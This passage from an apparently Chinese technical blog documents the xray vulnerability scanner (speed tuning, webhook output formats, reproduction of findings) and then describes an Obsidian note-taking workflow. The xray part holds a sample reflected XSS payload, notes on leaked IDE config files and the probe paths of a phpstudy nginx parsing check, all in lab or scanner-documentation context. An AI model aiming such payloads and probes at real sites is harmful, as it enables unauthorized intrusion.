id="优化扫描速度"><a href="#优化扫描速度" class="headerlink" title="优化扫描速度"></a>优化扫描速度</h3><p>在 xray 的默认配置中，影响扫描速度的主要有两个参数</p><ul><li><code>max_qps</code> 每秒最大请求数，默认值为 500</li><li><code>max_parallel</code> 插件调度并发数，默认值为 30</li></ul><blockquote><p>即使到了 2000 qps，也还没有达到配置的检测最大并发，所以 <code>max_parallel</code> 一般情况下不需要修改。<br><code>max_qps</code> 在非测试场景下，也很难打满，一般情况下只会改低，防止影响业务，而不需要再调高。</p></blockquote><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>限制 xray 扫描速度的主要原因为</p><ul><li>xray 与被扫描目标之间的网络情况</li><li>被扫描目标的性能；否则网络再好，扫描速度也无法提升</li></ul><p>这两点可以从 <code>latency</code> 和  <code>failedRatio</code> 字段评估。<code>latency</code> 比较大，超过 100ms，说明网络比较慢，或者被扫描的目标响应比较慢。<code>failedRatio</code> 比较大，说明网络比较差，或者被扫描目标负载高而失去了响应等。</p><p>在网络情况稳定的情况下，可以考虑</p><ul><li>降低 <code>max_qps</code>，防止业务方负载过高</li><li>关闭特定模块和禁用部分 poc，减少请求量</li><li>不要性能比较差的代理作为 xray 的扫描代理，比如 burp 的代理通过请求的速度基本只有几十 qps，这样整个扫描的瓶颈就在 burp 上了。</li></ul><h3 id="自定义POC语法和编写高质量POC"><a href="#自定义POC语法和编写高质量POC" class="headerlink" title="自定义POC语法和编写高质量POC"></a>自定义POC语法和编写高质量POC</h3><p><a href="https://docs.xray.cool/#/guide/poc">官方文档</a></p><h2 id="webhook"><a href="#webhook" class="headerlink" title="webhook"></a>webhook</h2><p><code>--webhook-output</code></p><p>统一的格式为:</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs json">&#123;<br>    <span class="hljs-attr">&quot;type&quot;</span>: <span class="hljs-string">&quot;xxx&quot;</span>,<br>    <span class="hljs-attr">&quot;data&quot;</span>: &#123;&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>type 的 enum 为 ：</p><ul><li>“web_statistic” web 扫描统计信息</li><li>“web_vuln” web 漏洞</li><li>“host_vuln” 服务漏洞</li><li>“subdomain” 子域名</li></ul><h3 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h3><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs json">&#123;<br>  <span class="hljs-attr">&quot;type&quot;</span>: <span class="hljs-string">&quot;web_vuln&quot;</span>,<br>  <span class="hljs-attr">&quot;data&quot;</span>: &#123;<br>    <span class="hljs-attr">&quot;create_time&quot;</span>: <span class="hljs-number">1604736253090</span>,<br>    <span class="hljs-attr">&quot;detail&quot;</span>: &#123;<br>      <span class="hljs-attr">&quot;addr&quot;</span>: <span class="hljs-string">&quot;http://127.0.0.1:9000/xss/example1.php?name=hacker&quot;</span>,<br>      <span class="hljs-attr">&quot;extra&quot;</span>: &#123;<br>        <span class="hljs-attr">&quot;param&quot;</span>: &#123;<br>          <span class="hljs-attr">&quot;key&quot;</span>: <span class="hljs-string">&quot;name&quot;</span>,<br>          <span class="hljs-attr">&quot;position&quot;</span>: <span class="hljs-string">&quot;query&quot;</span>,<br>          <span class="hljs-attr">&quot;value&quot;</span>: <span class="hljs-string">&quot;pkbnekwkjhwzabxnfjwh&quot;</span><br>        &#125;<br>      &#125;,<br>      <span class="hljs-attr">&quot;payload&quot;</span>: <span class="hljs-string">&quot;&lt;sCrIpT&gt;alert(1)&lt;/ScRiPt&gt;&quot;</span>,<br>      <span class="hljs-attr">&quot;snapshot&quot;</span>: [<br>        [<br>          <span class="hljs-string">&quot;GET /xxx&quot;</span>,<br>          <span class="hljs-string">&quot;HTTP/1.1 200 OK&quot;</span><br>        ]<br>      ]<br>    &#125;,<br>    <span class="hljs-attr">&quot;plugin&quot;</span>: <span class="hljs-string">&quot;xss/reflected/default&quot;</span>,<br>    <span class="hljs-attr">&quot;target&quot;</span>: &#123;<br>      <span class="hljs-attr">&quot;params&quot;</span>: [],<br>      <span class="hljs-attr">&quot;url&quot;</span>: <span class="hljs-string">&quot;http://127.0.0.1:9000/xss/example1.php&quot;</span><br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>type 是 <code>web_vuln</code> 或 <code>host_vuln</code></li><li>snapshot 是漏洞探测的请求流，定义是 <code>[][2]string</code>, 即每一组有两部分，对应于请求和响应。对于 sql 注入这种就会有多组请求响应。</li><li>target 实际意义不大, 主要是 detail 中的部分, detail 的定义为:</li></ul><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-built_in">type</span> VulnDetail struct &#123;<br>    Addr     <span class="hljs-built_in">string</span>                 `json:<span class="hljs-string">&quot;addr&quot;</span> yam<span class="hljs-variable">l:</span><span class="hljs-string">&quot;addr&quot;</span>`<br>    Payload  <span class="hljs-built_in">string</span>                 `json:<span class="hljs-string">&quot;payload&quot;</span> yam<span class="hljs-variable">l:</span><span class="hljs-string">&quot;payload&quot;</span>`<br>    SnapShot []interface&#123;&#125;          `json:<span class="hljs-string">&quot;snapshot&quot;</span> yam<span class="hljs-variable">l:</span><span class="hljs-string">&quot;snapshot&quot;</span>`<br>    Extra    <span class="hljs-keyword">map</span>[<span class="hljs-built_in">string</span>]interface&#123;&#125; `json:<span class="hljs-string">&quot;extra&quot;</span> yam<span class="hljs-variable">l:</span><span class="hljs-string">&quot;extra&quot;</span>`<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="web统计信息"><a href="#web统计信息" class="headerlink" title="web统计信息"></a>web统计信息</h3><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs json">&#123;<br>  <span class="hljs-attr">&quot;type&quot;</span>: <span class="hljs-string">&quot;web_statistic&quot;</span>,<br>  <span class="hljs-attr">&quot;data&quot;</span>: &#123;<br>    <span class="hljs-attr">&quot;num_found_urls&quot;</span>: <span class="hljs-number">1</span>,<br>    <span class="hljs-attr">&quot;num_scanned_urls&quot;</span>: <span class="hljs-number">1</span>,<br>    <span class="hljs-attr">&quot;num_sent_http_requests&quot;</span>: <span class="hljs-number">3</span>,<br>    <span class="hljs-attr">&quot;average_response_time&quot;</span>: <span class="hljs-number">0</span>,<br>    <span class="hljs-attr">&quot;ratio_failed_http_requests&quot;</span>: <span class="hljs-number">0</span>,<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li><code>num_found_urls</code> 发现的扫描目标数量</li><li><code>num_scanned_urls</code> 已扫描完成的扫描目标数量</li><li><code>num_sent_http_requests</code> 已经发出的漏洞探测请求数量</li><li><code>average_response_time</code> 近 30s 请求平均响应时间</li><li><code>ratio_failed_http_requests</code> 近 30s 请求失败率</li></ul><p>这些信息除了表面意思，还有其他隐藏含义：</p><ul><li>pending 的数量等于 <code>num_found_urls</code> - <code>num_scanned_urls</code>, 如果 pending = 0，那么就意味着扫描完成了</li><li><code>average_response_time</code> 比较高 (&gt;200ms) 意味着网络延迟比较大</li><li><code>ratio_failed_http_requests</code> 比较高(&gt;5%) 意味着可能有 waf, 反正就是很多请求失败了</li></ul><h3 id="子域名消息格式"><a href="#子域名消息格式" class="headerlink" title="子域名消息格式"></a>子域名消息格式</h3><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs json">&#123;<br>  <span class="hljs-attr">&quot;type&quot;</span>: <span class="hljs-string">&quot;subdomain&quot;</span>,<br>  <span class="hljs-attr">&quot;data&quot;</span>: &#123;<br>    <span class="hljs-attr">&quot;cname&quot;</span>: [],<br>    <span class="hljs-attr">&quot;domain&quot;</span>: <span class="hljs-string">&quot;example.com&quot;</span>,<br>    <span class="hljs-attr">&quot;extra&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>    <span class="hljs-attr">&quot;ip&quot;</span>: [<br>      &#123;<br>        <span class="hljs-attr">&quot;asn&quot;</span>: <span class="hljs-string">&quot;EDGECAST (ASN15133)&quot;</span>,<br>        <span class="hljs-attr">&quot;country&quot;</span>: <span class="hljs-string">&quot;北美洲 美国&quot;</span>,<br>        <span class="hljs-attr">&quot;ip&quot;</span>: <span class="hljs-string">&quot;93.184.216.34&quot;</span><br>      &#125;,<br>      &#123;<br>        <span class="hljs-attr">&quot;asn&quot;</span>: <span class="hljs-string">&quot;EDGECAST (ASN15133)&quot;</span>,<br>        <span class="hljs-attr">&quot;country&quot;</span>: <span class="hljs-string">&quot;北美洲 美国&quot;</span>,<br>        <span class="hljs-attr">&quot;ip&quot;</span>: <span class="hljs-string">&quot;2606:2800:220:1:248:1893:25c8:1946&quot;</span><br>      &#125;<br>    ],<br>    <span class="hljs-attr">&quot;parent&quot;</span>: <span class="hljs-string">&quot;example.com&quot;</span>,<br>    <span class="hljs-attr">&quot;verbose_name&quot;</span>: <span class="hljs-string">&quot;initial&quot;</span>,<br>    <span class="hljs-attr">&quot;web&quot;</span>: [<br>      &#123;<br>        <span class="hljs-attr">&quot;link&quot;</span>: <span class="hljs-string">&quot;http://example.com/&quot;</span>,<br>        <span class="hljs-attr">&quot;server&quot;</span>: <span class="hljs-string">&quot;ECS (sjc/4FB8)&quot;</span>,<br>        <span class="hljs-attr">&quot;status&quot;</span>: <span class="hljs-number">200</span>,<br>        <span class="hljs-attr">&quot;title&quot;</span>: <span class="hljs-string">&quot;Example Domain&quot;</span><br>      &#125;,<br>      &#123;<br>        <span class="hljs-attr">&quot;link&quot;</span>: <span class="hljs-string">&quot;https://example.com/&quot;</span>,<br>        <span class="hljs-attr">&quot;server&quot;</span>: <span class="hljs-string">&quot;ECS (sjc/4E8D)&quot;</span>,<br>        <span class="hljs-attr">&quot;status&quot;</span>: <span class="hljs-number">200</span>,<br>        <span class="hljs-attr">&quot;title&quot;</span>: <span class="hljs-string">&quot;Example Domain&quot;</span><br>      &#125;<br>    ]<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="VulnType大类复现"><a href="#VulnType大类复现" class="headerlink" title="VulnType大类复现"></a>VulnType大类复现</h2><h3 id="Server-error"><a href="#Server-error" class="headerlink" title="Server-error"></a>Server-error</h3><p><img src="Snipaste_2021-03-09_21-01-20.png" alt=""></p><p>使用bp的Repeater，设置目标复制Request即可。由于是概率引发error，多次刷新才行。<br><img src="Snipaste_2021-03-09_20-58-41.png" alt=""></p><h3 id="crossdomain"><a href="#crossdomain" class="headerlink" title="crossdomain"></a>crossdomain</h3><p><img src="Snipaste_2021-03-09_21-07-40.png" alt=""></p><h3 id="config-ide"><a href="#config-ide" class="headerlink" title="config/ide"></a>config/ide</h3><p><img src="Snipaste_2021-03-12_08-42-08.png" alt=""></p><p>其中，FileEditorManager包含文件名及相对路径</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;component <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;FileEditorManager&quot;</span>&gt;<br> <span class="hljs-built_in">..</span>.<br>&lt;file <span class="hljs-attribute">leaf-file-name</span>=<span class="hljs-string">&quot;cart.php&quot;</span> <span class="hljs-attribute">pinned</span>=<span class="hljs-string">&quot;false&quot;</span> <span class="hljs-attribute">current</span>=<span class="hljs-string">&quot;true&quot;</span> <span class="hljs-attribute">current-in-tab</span>=<span class="hljs-string">&quot;true&quot;</span>&gt;<br>&lt;entry <span class="hljs-attribute">file</span>=<span class="hljs-string">&quot;file://<span class="hljs-variable">$PROJECT_DIR</span>$/cart.php&quot;</span>&gt;<br></code></pre></td></tr></table></figure><p>Git.Settings包含Git的一些设置</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">&lt;component <span class="hljs-type">name</span>=&quot;Git.Settings&quot;&gt;<br>  &lt;<span class="hljs-keyword">option</span> <span class="hljs-type">name</span>=&quot;CHECKOUT_INCLUDE_TAGS&quot; <span class="hljs-keyword">value</span>=&quot;false&quot;/&gt;<br>  &lt;<span class="hljs-keyword">option</span> <span class="hljs-type">name</span>=&quot;UPDATE_CHANGES_POLICY&quot; <span class="hljs-keyword">value</span>=&quot;STASH&quot;/&gt;<br>  &lt;<span class="hljs-keyword">option</span> <span class="hljs-type">name</span>=&quot;LINE_SEPARATORS_CONVERSION&quot; <span class="hljs-keyword">value</span>=&quot;ASK&quot;/&gt;<br>&lt;/component&gt;<br></code></pre></td></tr></table></figure><p>ide文件历史记录</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">component</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;IdeDocumentHistory&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">option</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;changedFiles&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">list</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">option</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;$PROJECT_DIR$/.htaccess&quot;</span>/&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">option</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;$PROJECT_DIR$/cart.php&quot;</span>/&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">list</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">option</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">component</span>&gt;</span><br></code></pre></td></tr></table></figure><p>修改历史记录</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">component</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;ChangeListManager&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">list</span> <span class="hljs-attr">default</span>=<span class="hljs-string">&quot;true&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;190e5f86-a42c-4cc9-a03a-80ac0d47d6d2&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;Default&quot;</span> <span class="hljs-attr">comment</span>=<span class="hljs-string">&quot;&quot;</span>/&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">ignored</span> <span class="hljs-attr">path</span>=<span class="hljs-string">&quot;acuart.iws&quot;</span>/&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">ignored</span> <span class="hljs-attr">path</span>=<span class="hljs-string">&quot;.idea/workspace.xml&quot;</span>/&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">option</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;TRACKING_ENABLED&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;true&quot;</span>/&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">option</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;SHOW_DIALOG&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;false&quot;</span>/&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">option</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;HIGHLIGHT_CONFLICTS&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;true&quot;</span>/&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">option</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;HIGHLIGHT_NON_ACTIVE_CHANGELIST&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;false&quot;</span>/&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">option</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;LAST_RESOLUTION&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;IGNORE&quot;</span>/&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">component</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">component</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;editorHistoryManager&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">entry</span> <span class="hljs-attr">file</span>=<span class="hljs-string">&quot;file://$PROJECT_DIR$/.htaccess&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">provider</span> <span class="hljs-attr">selected</span>=<span class="hljs-string">&quot;true&quot;</span> <span class="hljs-attr">editor-type-id</span>=<span class="hljs-string">&quot;text-editor&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">state</span> <span class="hljs-attr">line</span>=<span class="hljs-string">&quot;6&quot;</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;0&quot;</span> <span class="hljs-attr">selection-start</span>=<span class="hljs-string">&quot;213&quot;</span> <span class="hljs-attr">selection-end</span>=<span class="hljs-string">&quot;222&quot;</span> <span class="hljs-attr">vertical-scroll-proportion</span>=<span class="hljs-string">&quot;0.124847&quot;</span>&gt;</span><br>...<br><span class="hljs-tag">&lt;<span class="hljs-name">entry</span> <span class="hljs-attr">file</span>=<span class="hljs-string">&quot;file://$PROJECT_DIR$/cart.php&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">provider</span> <span class="hljs-attr">selected</span>=<span class="hljs-string">&quot;true&quot;</span> <span class="hljs-attr">editor-type-id</span>=<span class="hljs-string">&quot;text-editor&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">state</span> <span class="hljs-attr">line</span>=<span class="hljs-string">&quot;60&quot;</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;26&quot;</span> <span class="hljs-attr">selection-start</span>=<span class="hljs-string">&quot;2336&quot;</span> <span class="hljs-attr">selection-end</span>=<span class="hljs-string">&quot;2336&quot;</span> <span class="hljs-attr">vertical-scroll-proportion</span>=<span class="hljs-string">&quot;-0.41645244&quot;</span>&gt;</span><br><br>...<br><span class="hljs-tag">&lt;/<span class="hljs-name">component</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="poc-yaml-phpstudy-nginx-wrong-resolve"><a href="#poc-yaml-phpstudy-nginx-wrong-resolve" class="headerlink" title="poc-yaml-phpstudy-nginx-wrong-resolve"></a>poc-yaml-phpstudy-nginx-wrong-resolve</h3><p>请求了</p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs axapta"><span class="hljs-number">94561621.</span>php<br><span class="hljs-keyword">index</span>.php<br><span class="hljs-keyword">index</span>.php/.php<br><span class="hljs-keyword">index</span>.php/.xxx<br></code></pre></td></tr></table></figure><p>只有<code>index.php</code>和<code>index.php/.php</code>请求成功了，并且都返回的是index.php的页面。但由于网页使用相对路径加载图片，所以在<code>index.php/.php</code>时图片都无法正常加载。</p><p><img src="Snipaste_2021-03-12_09-12-46.png" alt=""></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>笔记管理升级</title>
    <link href="/2021/02/12/%E7%AC%94%E8%AE%B0%E7%AE%A1%E7%90%86%E5%8D%87%E7%BA%A7/"/>
    <url>/2021/02/12/%E7%AC%94%E8%AE%B0%E7%AE%A1%E7%90%86%E5%8D%87%E7%BA%A7/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>我当前的笔记环境，是直接在hexo的根目录下，<code>_posts</code> 和 <code>_unposts</code> 文件进行笔记的记录，图片保存在<code>md文件名\</code>下，结构简陋，也不方便找（在两个文件夹下）。阅读了《漏洞战争》的作者泉哥的<a href="https://www.zhihu.com/column/p/138401561">技术人的修炼之道：从业余到专业 - 知乎</a>，也研究了一下<a href="https://obsidian.md/">Obsidian</a>，其展现的笔记间的关系则让我思考如何更好的记录和保存笔记。</p><h2 id="笔记方法之-Zettelkasten-卡片盒笔记法"><a href="#笔记方法之-Zettelkasten-卡片盒笔记法" class="headerlink" title="笔记方法之 Zettelkasten 卡片盒笔记法"></a>笔记方法之 Zettelkasten 卡片盒笔记法</h2><p>有本书是讲这个的，就是<a href="https://mp.weixin.qq.com/mp/appmsgalbum?__biz=MzI1NTA4Nzk5Mw==&action=getalbum&album_id=1464601583634939905">How to take smart notes</a>，感兴趣的请务必看一下这本书，很能启发人，半天到一天就能翻完。也可以选择看</p><p><a href="https://www.zhihu.com/question/384309878/answer/1120682799">什么是 Zettelkasten 卡片盒笔记法？ - 知乎</a></p><h3 id="笔记摘录"><a href="#笔记摘录" class="headerlink" title="笔记摘录"></a>笔记摘录</h3><blockquote><p>How to take smart note<br>分为四类：临时笔记、文献笔记、永久笔记、项目笔记。</p><p>文件名：最短最精确的话概括内容/概念。 </p><p>操作方法很简单，一部分是<strong>文章文献书目的信息</strong>，以及<strong>自己对内容的简要概括</strong>的卡片盒。一部分是永久笔记卡片盒。通过时不时的回看文章文献书目卡片，在<strong>永久笔记中写下想法看法，评论或补充</strong>。并且，会<strong>沿着已有笔记新增卡片，形成笔记链</strong>。再把<strong>相关的笔记链放在一起，做好记号写明参考笔记</strong>参考链接。这样这部分的笔记都是有千丝万缕的关系的。而且，完全不分类，而是将一两条笔记单独列出，作为索引卡。</p></blockquote><h3 id="笔记步骤"><a href="#笔记步骤" class="headerlink" title="笔记步骤"></a>笔记步骤</h3><blockquote><p>步骤一：临时笔记：记录突发奇想的念头，统一放到一个地方</p><blockquote><p>临时笔记要求：一个紧凑的关键句、详细说明的概念和一个例子。 文件名：最短最精确的话概括内容/概念。</p></blockquote><p>步骤二：文献笔记：读到想牢记在心的东西，仔细斟酌，用自己的话写下来，要言简意骇。斟酌并用自己的话写下来就是为了最大化的思考，经过大脑再保存下来，而不是复制粘贴收藏怪（笑</p><p>步骤三：永久笔记：每天游览临时笔记和文献笔记，思考与自己的联系。</p><p>关键：要做的不是收集，而是思考</p><ul><li>和以前的想法有不同之处吗？</li><li>可以支持或者否定之前的观点吗？</li><li>是否有新的知识？</li><li>是否可以整合想法？</li><li>有没有触发新的问题？</li></ul><p>步骤四：封装，将笔记形成链，或者网。如果想更标准一点，可以给链接设定类型。例子：补充、延伸、修正、 评论、反驳、例子、启发、疑问</p><p>步骤五：不断更新迭代。持续阅读，颠覆或强化已有观点，修正已有观点。看看他们最终带向哪里。跟着兴趣走，越感兴趣，越思考。</p></blockquote><h2 id="Obisidian特性"><a href="#Obisidian特性" class="headerlink" title="Obisidian特性"></a>Obisidian特性</h2><ul><li>internal link，可以连接笔记，跳转和展示</li><li>关系图，展示笔记间的关系</li><li><code>Ctrl + O</code>或<code>Command + O</code>快速切换笔记，带有搜索功能</li><li>以库的形式存储笔记，所以也可以一个库存上课的知识，一个库存阅读学习笔记这样的</li></ul><h2 id="Obsidian的使用"><a href="#Obsidian的使用" class="headerlink" title="Obsidian的使用"></a>Obsidian的使用</h2><p>抛砖引玉，介绍我的用法。</p><h3 id="我的文件夹结构"><a href="#我的文件夹结构" class="headerlink" title="我的文件夹结构"></a>我的文件夹结构</h3><p>如图</p><p>打码部分是从同学那顺来的</p><p>从How to take smart note中的哲学包含如下三个<br>文件夹/盒子，结合我自身的想法定的用途</p><ul><li>Output 放写好的文章</li><li>PermanentBox 放正在写的</li><li>RelatedBox 其他绝大部分笔记，杂乱的等</li></ul><p>然后根据需要添加了如下几个文件夹</p><ul><li>Category 作为我主要关注的，时不时要看和参考的笔记的入口</li><li>DailyDiary 每天日记都在里面</li><li>DailTmp 每周的都暂存里面，周日统一整理<del>和回顾</del></li><li>InsertPic 插入的图片都统一放里面</li><li>Templates 放插入的模板，比如日记模板，笔记模板，摘录模板等</li></ul><h3 id="日记"><a href="#日记" class="headerlink" title="日记"></a>日记</h3><p>效果如图</p><img src="/2021/02/12/%E7%AC%94%E8%AE%B0%E7%AE%A1%E7%90%86%E5%8D%87%E7%BA%A7/image-20210124200512351.png" class="" title="image-20210124200512351"><p>结合了插件：Calendar(左上日历样子的)，Natural Language Dates(将输入的日期转为特定格式)，Templater(插入模板)</p><p>Todo部分是打算的事情，Journal则是结合番茄时间（<a href="https://sspai.com/post/37307">经过 1700 个番茄时间，番茄工作法改变了我什么</a>），记录每个事件我都大概干了啥，以及将要干什么。这样可以在完成上一项任务的时候，清空大脑并高效面对下一件事情。Tracking则表示我在跟着做什么的，但从我自身的情况来看可以删掉（逃</p><p>Daily quote and Pic则是模板自动生成的。</p><h3 id="笔记"><a href="#笔记" class="headerlink" title="笔记"></a>笔记</h3><p><code>Ctrl + N</code>快捷生成一篇空的，设置默认放置在DailyTmp之中，介于这不是所写即所得的，所以我一般将一半设置为预览，一般为编辑</p><img src="/2021/02/12/%E7%AC%94%E8%AE%B0%E7%AE%A1%E7%90%86%E5%8D%87%E7%BA%A7/image-20210124201724241.png" class="" title="image-20210124201724241"><p>markdown部分都是一致的，所以说说几个不一样的点叭。一个是这个internal link，格式 <code>[[note_name]]</code>，鼠标悬停在上面会有笔记的预览窗口，带!号就默认显示。</p><img src="/2021/02/12/%E7%AC%94%E8%AE%B0%E7%AE%A1%E7%90%86%E5%8D%87%E7%BA%A7/image-20210124201918778.png" class="" title="image-20210124201918778"><p>并且，这样用多了之后，obsidian可以生成节点图，展示内在关系。</p><img src="/2021/02/12/%E7%AC%94%E8%AE%B0%E7%AE%A1%E7%90%86%E5%8D%87%E7%BA%A7/image-20210124202344312.png" class="" title="image-20210124202344312"><p>另一个例子</p><img src="/2021/02/12/%E7%AC%94%E8%AE%B0%E7%AE%A1%E7%90%86%E5%8D%87%E7%BA%A7/image-20210124202546728.png" class="" title="image-20210124202546728"><p>嗯对了，ob的窗口都是可以自由拖动和放大缩小的，也可以预设工作区，比如我ReadMode，默认就打开预览模式，在台式上就切换成上下样子，上面预览下面编辑这样。</p><p>再具体的操作我就不列举了，请继续阅读学习更高效更好的用法叭！我不行了QAQ</p><h2 id="推荐阅读"><a href="#推荐阅读" class="headerlink" title="推荐阅读"></a>推荐阅读</h2><p><a href="https://sspai.com/post/63481">玩转 Obsidian | 基础设置篇 - 少数派</a></p><p><a href="https://sspai.com/post/63674">玩转 Obsidian | 间歇式日记 - 少数派</a></p><p><a href="https://sspai.com/post/62414">玩转 Obsidian | 打造知识循环利器 - 少数派</a></p><h2 id="相关模板"><a href="#相关模板" class="headerlink" title="相关模板"></a>相关模板</h2><p>提供参考</p><h3 id="摘录模板"><a href="#摘录模板" class="headerlink" title="摘录模板"></a>摘录模板</h3><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><br><span class="hljs-attr">Link:</span> <br><span class="hljs-attr">Tag:</span> <br><span class="hljs-attr">Category:</span> <br><br><span class="hljs-meta">---</span><br></code></pre></td></tr></table></figure><h3 id="日记模板"><a 